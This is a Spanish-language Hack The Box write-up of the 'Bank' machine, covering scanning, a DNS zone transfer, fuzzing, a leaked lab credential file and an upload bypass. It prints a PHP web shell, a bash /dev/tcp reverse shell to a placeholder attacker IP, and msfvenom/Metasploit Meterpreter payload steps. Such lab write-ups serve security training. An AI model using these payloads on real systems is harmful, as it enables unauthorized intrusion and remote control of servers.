---
title: "Bank - Hack The Box"
date: 2023-02-19
draft: false
slug: "htb-writeup-bank"
excerpt: "Esta máquina fue algo difícil porque no pude escalar privilegios usando un Exploit sino que se usa un binario que automáticamente te convierte en Root, además de que tuve que investigar bastante sobre operaciones REGEX para poder filtrar texto. Aunque se ven temas interesantes como el ataque de transferencia de zona DNS y veremos acerca del virtual hosting que por lo que he investigado, hay otras máquinas que lo van a ocupar."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "Apache httpd 2.4.7", "Domain Zone Transfer Zone Attack (AXFR)", "Virtual Hosting", "Fuzzing", "Information Leakage", "Remote Command Execution (RCE)", "Reverse Shell", "Local Privilege Escalation (LPE)", "Privesc - Abusing SUID Binary (LPE)", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "dig"
  - "wfuzz"
  - "gobuster"
  - "curl"
  - "cat"
  - "grep"
  - "nc"
  - "git"
  - "PHP"
  - "msfvenom"
  - "metasploit framework(msfconsole)"
  - "Módulo: exploit/multi/handler"
  - "Módulo: post/multi/recon/local_exploit_suggester"
  - "meterpreter"
  - "python"
  - "id"
  - "uname"
  - "searchsploit"
  - "find"
links:
  - "https://linube.com/ayuda/articulo/267/que-es-un-virtualhost"
  - "https://www.reydes.com/d/?q=Solicitar_una_Transferencia_de_Zona_utilizando_el_Script_dns_zone_transfer_de_Nmap"
  - "https://www.welivesecurity.com/la-es/2015/06/17/trata-ataque-transferencia-zona-dns/"
  - "https://www.hostinger.mx/tutoriales/comando-dig-linux https://www.ecured.cu/Html2text"
  - "https://tecnonautas.net/como-usar-curl-para-descargar-archivos-y-paginas-web/"
  - "https://itsfoss.com/es/descargar-archivos-desde-terminal-linux/ https://atareao.es/tutorial/terminal/filtros-awk-grep-sed-y-cut/"
  - "https://geekland.eu/uso-del-comando-awk-en-linux-y-unix-con-ejemplos/"
  - "https://www.enmimaquinafunciona.com/pregunta/67844/uso-de-sed-para-eliminar-digitos-y-espacios-en-blanco-de-una-cadena"
  - "https://github.com/pentestmonkey/php-reverse-shell https://pentestmonkey.net/tools/web-shells/php-reverse-shell"
  - "https://www.exploit-db.com/exploits/43418 https://openwebinars.net/blog/wget-descargas-desde-linea-de-comandos/"
  - "https://www.enmimaquinafunciona.com/pregunta/75153/inicio-de-sesion-interactivo-y-no-interactivo-shell"
  - "https://esgeeks.com/post-explotacion-transferir-archivos-windows-linux/#http"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-bank/bank_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veamos que SO opera ahí.
```bash
ping -c 4 10.10.10.29                                                             
PING 10.10.10.29 (10.10.10.29) 56(84) bytes of data.
64 bytes from 10.10.10.29: icmp_seq=1 ttl=63 time=132 ms
64 bytes from 10.10.10.29: icmp_seq=2 ttl=63 time=132 ms
64 bytes from 10.10.10.29: icmp_seq=3 ttl=63 time=131 ms
64 bytes from 10.10.10.29: icmp_seq=4 ttl=63 time=134 ms

--- 10.10.10.29 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 130.666/132.167/134.499/1.417 ms
```
Por el TTL, sabemos que es una máquina Linux, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.29 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 12:01 CST
Initiating SYN Stealth Scan at 12:01
Scanning 10.10.10.29 [65535 ports]
Discovered open port 22/tcp on 10.10.10.29
Discovered open port 80/tcp on 10.10.10.29
Discovered open port 53/tcp on 10.10.10.29
Completed SYN Stealth Scan at 12:02, 23.93s elapsed (65535 total ports)
Nmap scan report for 10.10.10.29
Host is up, received user-set (0.44s latency).
Scanned at 2023-02-19 12:01:41 CST for 24s
Not shown: 33062 closed tcp ports (reset), 32470 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.00 seconds
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay tres puertos abiertos, hay 2 servicios que ya conocemos por los puertos, estos son el **servicio SSH y el servicio HTTP**. Veamos que nos dice el escaneo de servicios.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV -p22,53,80 10.10.10.29 -oN targeted                                     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 12:04 CST
Nmap scan report for 10.10.10.29
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   1024 08eed030d545e459db4d54a8dc5cef15 (DSA)
|   2048 b8e015482d0df0f17333b78164084a91 (RSA)
|   256 a04c94d17b6ea8fd07fe11eb88d51665 (ECDSA)
|_  256 2d794430c8bb5e8f07cf5b72efa16d67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)

| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))

|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.66 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Vemos lo que opera en los puertos, para empezar como no tenemos credenciales no podemos entrar al **servicio SSH**, así que lo único que podemos hacer es revisar la página web.

![](/assets/images/htb-writeup-bank/Captura1.png)

Pues nos manda la página por defecto de **Apache** y no nos muestra nada en realidad. Incluso no es necesario ver el **Wappalizer** porque no nos muestra nada que nos pueda ayudar.

¿Entonces que hacemos? Es momento de investigar.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Bueno para el caso de esta máquina hay que ser preciso en un tema importante:

* *No es lo mismo poner una IP de un dominio a poner el nombre del dominio, ejemplo, 10.10.10.29 (IP) o Ejemplo.com (Dominio)*

¿Por qué? Porque quizá el servidor o máquina donde estén operando dichas páginas web tenga activo el **Virtual Hosting**.

¿Y esta cosa que es? Bueno:

| **Virtual Hosting** |
|:-----------:|
| *El alojamiento compartido o alojamiento virtual, en inglés Virtual hosting, es una de las modalidades más utilizadas por las empresas dedicadas al negocio del alojamiento web. Dependiendo de los recursos disponibles, permite tener una cantidad variable de dominios y sitios web en una misma máquina.* |

Es decir, que puede haber varios dominios en solo una máquina, como en este caso.

Esto también lo podemos saber, por el servicio que esta operando en el puerto 53, que es el **DNS ISC BIND**:

| **DNS ISC BIND** |
|:-----------:|
| *BIND es el servidor de DNS más comúnmente usado en Internet, ​​ especialmente en sistemas Unix, en los cuales es un estándar de facto.​ Es patrocinado por la Internet Systems Consortium (ISC).* |

#### Probando Virtual Hosting de Máquina Víctima {#Virtual}

¿Qué podemos hacer? Es sencillo, para nuestro caso **Hack The Box** suele tener dominios con el nombre de la máquina seguido de **.htb**. 

Podemos probar si esto es verdad mandando un ping al dominio **bank.htb**, que deducimos es el nombre de dominio que está ocupando la máquina:

```bash
ping -c 1 bank.htb   
ping: bank.htb: Nombre o servicio desconocido
```

Ok, pero no nos sale nada, ¿ahora qué? Tan simple como que tengamos que registrar ese dominio en el archivo **hosts** que esta guardado en el directorio **etc**, hagámoslo:
```bash
locate /etc/hosts    
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
nano /etc/hosts
```

Una vez dentro, vamos a poner la ip de la máquina más el dominio **bank.htb**:
```bash
10.10.10.29 bank.htb
```

Guardamos, salimos y volvemos a intentar mandar el ping:
```bash
ping -c 1 bank.htb
PING bank.htb (10.10.10.29) 56(84) bytes of data.
64 bytes from bank.htb (10.10.10.29): icmp_seq=1 ttl=63 time=130 ms

--- bank.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 130.266/130.266/130.266/0.000 ms
```
¡EXCELENTE! Ahora sabemos que ese dominio si existe, por lo que intentemos entrar en el poniendo el nombre del dominio directamente en el buscador.

![](/assets/images/htb-writeup-bank/Captura2.png)

Ahí está, tenemos un login, veamos que nos dice el **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-bank/Captura3.png">
</p>

Tenemos bastante información que nos puede ser útil más adelante. Ahora vamos a utilizar una herramienta bastante útil para estos casos llamada **dig**.

#### Recopilando Información de Registros DNS de la Máquina Víctima con Herramienta Dig {#dig}

¿Qué hace la herramienta **dig**?

| **Herramienta Dig** |
|:-----------:|
| *Dig (Domain Information Groper) es una herramienta de línea de comandos de Linux que realiza búsquedas en los registros DNS, a través de los nombres de servidores, y te muestra el resultado.* |

Aqui el link con más información:
* <a href="https://www.hostinger.mx/tutoriales/comando-dig-linux" target="_blank">Cómo usar el comando Dig en Linux</a>

Entonces, utilicemos esta herramienta, hagamos varias pruebas:

* Vamos a especificar el servidor **(@IP)** y un dominio **(bank.htb)**:
```bash
dig @10.10.10.29 bank.htb     
; <<>> DiG 9.18.12-1-Debian <<>> @10.10.10.29 bank.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 54337
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2
;; WARNING: recursion requested but not available
;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;bank.htb.                      IN      A
;; ANSWER SECTION:
bank.htb.               604800  IN      A       10.10.10.29
;; AUTHORITY SECTION:
bank.htb.               604800  IN      NS      ns.bank.htb.
;; ADDITIONAL SECTION:
ns.bank.htb.            604800  IN      A       10.10.10.29
;; Query time: 131 msec
;; SERVER: 10.10.10.29#53(10.10.10.29) (UDP)
;; WHEN: Mon Apr 03 13:12:37 CST 2023
;; MSG SIZE  rcvd: 86
```

* Bien, ahora veamos que correos están registrados en la máquina:
```bash
dig @10.10.10.29 bank.htb MX  
; <<>> DiG 9.18.12-1-Debian <<>> @10.10.10.29 bank.htb MX
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 61728
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available
;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;bank.htb.                      IN      MX
;; AUTHORITY SECTION:
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
;; Query time: 135 msec
;; SERVER: 10.10.10.29#53(10.10.10.29) (UDP)
;; WHEN: Mon Apr 03 13:17:34 CST 2023
;; MSG SIZE  rcvd: 79
```
Muy bien, tenemos un correo que en este caso puede ser un usuario para que podamos acceder después. Lo que podemos hacer son 2 cosas, la primera un **Fuzzing** para ver que subdominios tiene esta página web y dos, ver si podemos hacer un **ataque de transferencia de zona DNS**.

### Fuzzing {#Fuzz}

Primero hagamos el **Fuzzing** y luego explico el ataque:
```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://bank.htb/FUZZ/    
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bank.htb/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                     
=====================================================================

000000014:   302        188 L    319 W      7322 Ch     "http://bank.htb//"                                                         
000000083:   403        10 L     30 W       281 Ch      "icons"                                                                     
000000291:   200        20 L     104 W      1696 Ch     "assets"                                                                    
000000164:   403        10 L     30 W       283 Ch      "uploads"                                                                   
000002190:   200        19 L     89 W       1530 Ch     "inc"                                                                       
000045240:   302        188 L    319 W      7322 Ch     "http://bank.htb//"                                                         
000095524:   403        10 L     30 W       289 Ch      "server-status"                                                             
000192709:   200        1014 L   11038 W    253503 Ch   "balance-transfer"                                                          

Total time: 585.2624
Processed Requests: 220560
Filtered Requests: 220539
Requests/sec.: 376.8565
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Excelente, ahora vamos a hacer lo mismo, pero con Gobuster:

```bash
gobuster dir -u http://bank.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bank.htb/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 305] [--> http://bank.htb/uploads/]
/assets               (Status: 301) [Size: 304] [--> http://bank.htb/assets/]
/inc                  (Status: 301) [Size: 301] [--> http://bank.htb/inc/]
/server-status        (Status: 403) [Size: 288]
/balance-transfer     (Status: 301) [Size: 314] [--> http://bank.htb/balance-transfer/]
Progress: 220530 / 220561 (99.99%)
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Bien, vemos algunos subdominios que podemos investigar, ahora el ataque.

¿Qué es un **Ataque de Transferencia de Zona DNS**?:

| **Ataque de Transferencia de Zona DNS (AXFR)** |
|:-----------:|
| *Una transferencia de zona es un mecanismo para replicar datos de DNS a través de servidores DNS. Es decir si se tienen dos servidores DNS, el primer servidor confía en AXFR para poner los mismos datos en un segundo servidor. AXFR es también utilizado por terceros no autorizados quienes requieran obtener datos más profundos de un sitio.* |

Entonces, lo que conseguiremos será más información sobre subdominios, algo similar al **Fuzzing** que hicimos, entonces probémoslo: 
```bash
 dig @10.10.10.29 bank.htb AXFR
.
; <<>> DiG 9.18.12-1-Debian <<>> @10.10.10.29 bank.htb AXFR
; (1 server found)
;; global options: +cmd
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
bank.htb.               604800  IN      NS      ns.bank.htb.
bank.htb.               604800  IN      A       10.10.10.29
ns.bank.htb.            604800  IN      A       10.10.10.29
www.bank.htb.           604800  IN      CNAME   bank.htb.
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
;; Query time: 131 msec
;; SERVER: 10.10.10.29#53(10.10.10.29) (TCP)
;; WHEN: Mon Apr 03 13:23:13 CST 2023
;; XFR size: 6 records (messages 1, bytes 171)
```
Pues mucha información no nos dio, salvo el dominio **ns.bank.htb**, así que vamos a analizar los directorios que obtuvimos del **Fuzzing**.

### Analizando Subdominios {#Subdom}

Hice dos pruebas de **Fuzzing**, una normal, que es la que está arriba, y la otra poniendo la extension **.php**, en esta última no salió nada relevante, solo quería mencionarlo.

Como vemos, hay algunos subdominios, pero el que más llama la atención es el **balance-transfer**, entremos a ese:

<p align="center">
<img src="/assets/images/htb-writeup-bank/Captura5.png">
</p>

Changos, hay muchos archivos, pero ¿qué es esa extención **.acc**?, vamos a investigarla:

| **Archivos ACC** |
|:-----------:|
| *Los archivos en el formato ACC son utilizados por el software de Cuentas gráficas como archivos de datos de salida del proyecto que contienen datos introducidos por el autor de los archivos del CAC.* |

Quiero entender, que aquí se guardan datos que se han utilizado en la página web, como son muchos no quiero ponerme a ver cada uno a menos que lo requiera, entonces lo que haremos será descargar el texto de esta página para buscar si hay alguno diferente.

¿Y esto por qué? Porque hay muchos con el mismo peso, debe haber algunos con menor o mayor peso y eso quiere decir que son únicos.

Para descargar el texto vamos a usar **curl** y expresiones **REGEX** para filtrar, vamos por pasos:

* Descargamos el texto de esta página:
```bash
curl -s -X GET "http://bank.htb/balance-transfer/"
```

Si lo dejamos así, solo veremos el código HTML por lo que usaremos la herramienta **html2text** para cambiar de HTML a texto:
```bash
curl -s -X GET "http://bank.htb/balance-transfer/" | html2text
```

Ahora si se ve en texto, pero no quiero que se vean esos corchetes además de que nos molestaran a la hora del filtrado, así que vamos a eliminarlos con **awk**:
```
curl -s -X GET "http://bank.htb/balance-transfer/" | html2text | awk '{print $3 " " $5}' > output.txt
```
Ahora sí, con eso ya solamente quedaría el nombre del archivo y su peso.

* Filtramos por **REGEX** para ver si hay archivos con menor o mayor peso:
```bash
cat output | sed '/^\s*$/d' |
```
Con **sed** vamos a eliminar los espacios que hay entre cada archivo de arriba a abajo para que solo queden los puros nombres y pesos. 

* Con **grep** vamos a ir eliminando los pesos más comunes que vimos a ojo de buen cubero, ósea el 585, 584, 583 y 582:
```bash
cat output | sed '/^\s*$/d' | grep -v -E "582|583|584|585"
```

* Resultado final:
```bash
cat output | sed '/^\s*$/d' | grep -v -E "582|583|584|585"
of ******
Last Description
   
09ed7588d1cd47ffca297cc7dac22c52.acc 581
941e55bed0cb8052e7015e7133a5b9c7.acc 581
68576f20e9732f1b2edc4df5b8533230.acc 257
Server bank.htb
```
¡BRAVO! Hay 3 archivos poco comunes pero el que más llama la atención es el que pesa 257, vamos a descargarlo buscándolo en la página y dándole click:

<p align="center">
<img src="/assets/images/htb-writeup-bank/Captura6.png">
</p>

Lo mandamos al directorio de trabajo y vemos su contenido:
```bash
cat 68576f20e9732f1b2edc4df5b8533230.acc 
--ERR ENCRYPT FAILED
+=================+

| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```
Mira nada más, son el usuario y contraseña, bueno ya teníamos un usuario, ahora vamos a probarlos:

![](/assets/images/htb-writeup-bank/Captura7.png)

¡Entramos! Investiguemos que podemos hacer.

![](/assets/images/htb-writeup-bank/Captura8.png)

Veo que podemos subir archivos, pero no dice de que tipo. Quizá si analizamos el código fuente de la página podremos encontrar algo útil, para hacer esto solo oprimimos **ctrl + u**:

![](/assets/images/htb-writeup-bank/Captura9.png)

¡Ahí está! Solamente acepta archivos con terminación **.htb** y dichos archivos deben ser hechos en **PHP**, lo que podemos hacer es cargar un Payload para poder conectarnos de manera remota. Busquemos uno en internet:

Aqui un Payload:
* <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">Repositorio de pentestmonkey: php-reverse-shell</a>

## Explotación de Vulnerabilidades {#Explotacion}

### Ganando Acceso a la Máquina {#Acceso}

En el link anterior hay un Payload hecho en **PHP** que debemos modificar metiendo nuestra IP y un puerto al que debemos conectarnos, hagámoslo por pasos:

* Descargando Payload:
```bash
git clone https://github.com/pentestmonkey/php-reverse-shell.git                         
Clonando en 'php-reverse-shell'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 10 (delta 1), reused 1 (delta 1), pack-reused 7
Recibiendo objetos: 100% (10/10), 9.81 KiB | 837.00 KiB/s, listo.
Resolviendo deltas: 100% (2/2), listo.
```

* Ahora modificamos el Payload, puedes eliminar lo demás, no es necesario:
```bash
$VERSION = "1.0";
$ip = 'Tu_IP';  // CHANGE THIS
$port = Puerto_Que_Quieras;       // CHANGE THIS
$chunk_size = 1400;
```

* Bien, vamos a renombrarlo para agregarle la extensión **.htb**:
```bash
mv php-reverse-shell.php LocalRS.htb
```

* Una vez ya modificado, lo subimos:

<p align="center">
<img src="/assets/images/htb-writeup-bank/Captura10.png">
</p>

* Levantamos una **netcat** con el puerto que pusimos en el Payload:
```bash
nc -nvlp 443                          
listening on [any] 443 ...
```

* Ya cargado en la página el Payload, le damos click en donde lo pide:

<p align="center">
<img src="/assets/images/htb-writeup-bank/Captura11.png">
</p>

* ¡Y estamos dentro!:
```bash
nc -nvlp 443                          
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.29] 56838
Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux
 01:46:21 up 38 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
Ya solo es cosa de buscar la flag del usuario que esta en el directorio **/home**.

### Ganando Acceso con Archivo CMD de PHP {#cmd}

Como ya vimos que si acepto nuestro archivo malicioso, vamos a probar a cargar un archivo que contenga una **CMD** en **PHP**, para que podamos ejecutar comandos desde la Web y poder ganar acceso desde ahí.

Hagamoslo por pasos:

* Crea el siguiente script en **PHP**:
```php
<?php
	system($_REQUEST['cmd']);
?>
```

* Carga el script y ve entra en ese archivo:

<p align="center">
<img src="/assets/images/htb-writeup-bank/Captura12.png">
</p>

* Desde la URL ya podras ejecutar cualquier comando.

<p align="center">
<img src="/assets/images/htb-writeup-bank/Captura13.png">
</p>

* Levanta una **netcat**:
```bash
nc -nvlp 1234
listening on [any] 1234 ...
```

* Ejecuta el siguiente comando en la URL, **cambiamos los ampersant (&) por %26** para que funcione correctamente:
```bash
Original:
?cmd=bash -c 'bash -i >& /dev/tcp/Tu_IP/1234 0&>1'
.
.
Modificado para web:
?cmd=bash -c 'bash -i >%26 /dev/tcp/Tu_IP/1234 0>%261'
```

* Observa la **netcat**:
```bash
nc -nvlp 1234
listening on [any] 1234 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.29] 44272
bash: cannot set terminal process group (1069): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bank:/var/www/bank/uploads$ whoami
whoami
www-data
```

Y listo, ya hemos ganado acceso de esta otra forma. Puedes hacer un tratamiento de la TTY, pero creo que es un poco inestable la shell, así que ten cuidado.

### Ganando Acceso con Metasploit Framework {#metas}

Para realizar esto, necesitamos una **Reverse Shell** que nos de una sesión de **Meterpreter**, para hacer esto necesitamos la **herramienta msfvenom** para crear el Payload que sea ejecutable en **PHP**.

Hagamoslo por pasos:

* Ejecuta el siguiente comando para crear nuestra **Reverse Shell** con **Msfvenom**:
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=Tu_IP LPORT=1212 -f raw > shell.htb
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 34850 bytes
```

* Cargalo a la página.

<p align="center">
<img src="/assets/images/htb-writeup-bank/Captura14.png">
</p>

* Abre el **Metasploit** y usa el **modulo multi/handler**, vamos a configurarlo para que nuestra Reverse Shell se pueda conectar con la misma configuración:
```bash
msfconsole
.
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) >
msf6 exploit(multi/handler) > set LHOST TU_IP
LHOST => Tu_IP
msf6 exploit(multi/handler) > set LPORT 1212
LPORT => 1212
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter_reverse_tcp
payload => linux/x86/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > exploit
.
[*] Started reverse TCP handler on Tu_IP:1212 
[*] Meterpreter session 1 opened (Tu_IP:1212 -> 10.10.10.29:57824)
.
meterpreter > sysinfo
Computer    : bank
OS          : Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data
```
Y listo, con esto hemos ganado acceso a la máquina con **Metasploit Framework**.

## Post Explotación {#Post}

### Enumeración de Máquina {#Enum}

¿Qué podemos hacer? Lo más fácil seria ver que permisos tenemos, pero antes vamos a sacar un terminal más interactiva:
```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@bank:/$ ls
ls
bin   etc         initrd.img.old  media  proc  sbin  tmp  vmlinuz
boot  home        lib             mnt    root  srv   usr  vmlinuz.old
dev   initrd.img  lost+found      opt    run   sys   var
```

Ahora si, vamos a ver los permisos:
```bash
www-data@bank:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Mmmmm no creo que sean muy útiles los permisos, veamos que versión de Linux tiene, aunque el escaneo de servicios ya nos lo dio:
```bash
www-data@bank:/$ uname -r
uname -r
4.4.0-79-generic
www-data@bank:/$ uname -a
uname -a
Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux
```

Muy bien, busquemos un Exploit. 

Buscando un Exploit por internet, encontré este:
* <a href="https://www.exploit-db.com/exploits/44298" target="_blank">Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation</a>

Bien, busquemoslo con **Searchsploit**:
```bash
searchsploit Ubuntu 16.04.4  
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path

|---|---|
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                     | linux/local/44298.c

|---|---|
Shellcodes: No Results
Papers: No Results
```

Analizándolo un poco pues no creo que nos sirva mucho, más que nada no tiene especificaciones sobre cómo usarlo, entonces busquemos otro:
```bash
searchsploit Linux 4.4.0-79        
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path

|---|---|
Alienvault Open Source SIEM (OSSIM) < 4.7.0 - 'get_license' Remote Command Execution (Metasploit)          | linux/remote/42697.rb
Alienvault Open Source SIEM (OSSIM) < 4.7.0 - av-centerd 'get_log_line()' Remote Code Execution            | linux/remote/33805.pl
Alienvault Open Source SIEM (OSSIM) < 4.8.0 - 'get_file' Information Disclosure (Metasploit)               | linux/remote/42695.rb
AppArmor securityfs < 4.8 - 'aa_fs_seq_hash_show' Reference Count Leak                                     | linux/dos/40181.c
CyberArk < 10 - Memory Disclosure                                                                          | linux/remote/44829.py
CyberArk Password Vault < 9.7 / < 10 - Memory Disclosure                                                   | linux/dos/44428.txt
Dell EMC RecoverPoint < 5.1.2 - Local Root Command Execution                                               | linux/local/44920.txt
Dell EMC RecoverPoint < 5.1.2 - Local Root Command Execution                                               | linux/local/44920.txt
Dell EMC RecoverPoint < 5.1.2 - Remote Root Command Execution                                              | linux/remote/44921.txt
Dell EMC RecoverPoint < 5.1.2 - Remote Root Command Execution                                              | linux/remote/44921.txt
Dell EMC RecoverPoint boxmgmt CLI < 5.1.2 - Arbitrary File Read                                            | linux/local/44688.txt
DenyAll WAF < 6.3.0 - Remote Code Execution (Metasploit)                                                   | linux/webapps/42769.rb
Exim < 4.86.2 - Local Privilege Escalation                                                                 | linux/local/39549.txt
Exim < 4.90.1 - 'base64d' Remote Code Execution                                                            | linux/remote/44571.py
Exim4 < 4.69 - string_format Function Heap Buffer Overflow (Metasploit)                                    | linux/remote/16925.rb
Fortinet FortiGate 4.x < 5.0.7 - SSH Backdoor Access                                                       | linux/remote/43386.py
Jfrog Artifactory < 4.16 - Arbitrary File Upload / Remote Command Execution                                | linux/webapps/44543.txt
LibreOffice < 6.0.1 - '=WEBSERVICE' Remote Arbitrary File Disclosure                                       | linux/remote/44022.md
Linux < 4.14.103 / < 4.19.25 - Out-of-Bounds Read and Write in SNMP NAT Module                             | linux/dos/46477.txt
Linux < 4.16.9 / < 4.14.41 - 4-byte Infoleak via Uninitialized Struct Field in compat adjtimex Syscall     | linux/dos/44641.c
Linux < 4.20.14 - Virtual Address 0 is Mappable via Privileged write() to /proc/*/mem                      | linux/dos/46502.txt
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                  | solaris/local/15962.c
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Rin | linux/local/9479.c
...
```

Son un buen, pero el que me llamo la atención fue este: **Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation**

Pero antes, si tienes la sesión activa del **Meterpreter** en **Metasploit**, entonces puedes usar el **modulo Suggester**, para que nos diga si encuentra algún exploit que pueda vulnerar la máquina.

